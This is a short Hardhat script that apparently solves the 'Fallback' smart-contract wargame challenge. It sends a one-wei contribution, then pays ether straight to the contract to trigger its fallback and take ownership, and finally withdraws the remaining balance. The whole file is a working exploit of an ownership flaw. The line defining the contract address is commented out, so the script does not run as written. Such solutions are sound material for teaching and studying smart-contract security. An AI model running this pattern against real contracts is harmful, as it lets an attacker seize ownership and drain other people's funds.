import { ethers } from "hardhat";

/// const contractAddress = "XXX"; insert address here
const contractName = "Fallback";

async function main() {
  let tx;

  const [attacker] = await ethers.getSigners();

  const factory = await ethers.getContractFactory(contractName);
  const contract = factory.attach(contractAddress);

  // Contribute to appear in the `contributors` array
  tx = await contract.contribute({ value: 1 });
  await tx.wait();

  // Take ownership of the contract
  tx = await attacker.sendTransaction({
    to: contract.address,
    value: 1,
  });
  await tx.wait();

  // Withdraw remaining eth
  tx = await contract.withdraw();
  await tx.wait();
}

main().catch(error => {
  console.error(error);
  process.exit(1);
});